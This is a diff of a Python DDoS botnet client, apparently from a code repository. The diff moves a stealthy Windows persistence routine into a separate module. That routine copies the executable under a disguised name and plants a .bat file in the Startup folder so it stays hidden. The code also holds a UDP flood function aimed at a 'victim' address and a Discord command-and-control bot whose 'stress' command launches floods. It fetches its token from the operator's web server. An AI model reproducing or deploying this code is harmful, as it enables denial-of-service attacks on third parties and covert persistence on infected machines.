@@ -2,44 +2,10 @@ import time #For the flood function
 import socket#For the flood function
 import random#For the flood function
 import requests#To get the data from your webserver
-import os#For the runatstartup() feature
-import shutil#For the runatstartup() feature
-import sys#For the runatstartup() feature
+import runatstartup#for the run at startup functionality
 import discord#For the discord command and control
 from discord.ext import commands#For the discord command and control
-def runatstartup():
-    if os.name != 'nt': #don't attempt to auto run at startup if not windows
-        return
-    else:
-        user = os.getlogin()#Get the currently logged in user
-        startupdir = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % (user) #Get the current user's startup directory
-        selffile = 'updatex64.exe' #Name to save the exe as. 
-        exedirec = r'C:\Program Files'#directory to write the exe to 
-        startupbatdir = startupdir + '\syshandlr.bat'# name of the .bat file that will show up in the startup folder
-        try:
-            shutil.copy(selffile, exedirec)#Copy the exe to the exe directory
-            f= open(startupbatdir,"w+")#Create the .bat in the startup directory
-            fulldirec = exedirec + "\\" + os.path.basename(sys.argv[0])#Calculate the exact path of the exe by adding the exe directory to the file name.
-            f.write(fulldirec)#write this into the bat so the bat runs the exe
-            f.close()#close the writing code.
-
-        except:
-            failed = True#No implementation for this 'failed' variable yet, simply there to fill the space
-def ipv4(address):#Check if an ipv4 address is valid. See: https://stackoverflow.com/a/4017219 for credits. 
-    address = str(address)
-    try:
-        socket.inet_pton(socket.AF_INET, address)
-    except AttributeError:  
-        try:
-            socket.inet_aton(address)
-        except socket.error:
-            return False
-        return address.count('.') == 3
-    except socket.error:  
-        return False
-
-    return True
-
+import ipv4#to verify it's a valid ipv4
 def flood(victim, vport, duration):#The flooding protocol. Note that this has no type of ip spoofing or amplification implemented yet. 
     port = vport #It works :shrug:
     clienta = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)#Open the socket to the client.
@@ -53,7 +19,7 @@ def flood(victim, vport, duration):#The flooding protocol. Note that this has no
         else:
             pass
         clienta.sendto(bytes, (victim, vport))
-runatstartup()#Copy the running exe to C:\Windows\en-US and create a .bat file in Programs\Startup that will run the exe, this way the exe does not show up in the startup list.
+runatstartup.start()#Copy the running exe to C:\Windows\en-US and create a .bat file in Programs\Startup that will run the exe, this way the exe does not show up in the startup list.
 webserverip = 'your.public.ipv4.ip'#change to your webserver IP only. No domain names etc
 token = requests.get('http://' + webserverip + '/token.html').text#Get the token from your webserver/token.html
 bot = commands.Bot(command_prefix='/')#Initialize the discord bot
@@ -93,7 +59,7 @@ async def on_message(message):
     await bot.process_commands(message)
 @bot.command()
 async def stress(ctx,ip,port,time):
-    if ipv4(ip) == True:
+    if ipv4.valid(ip) == True:
         stre = int(requests.get('http://' + webserverip + '/channel.html').text) #Get the stressing channel id again for redunancy. 
         if ctx.channel.id == stre:
             if True == True:
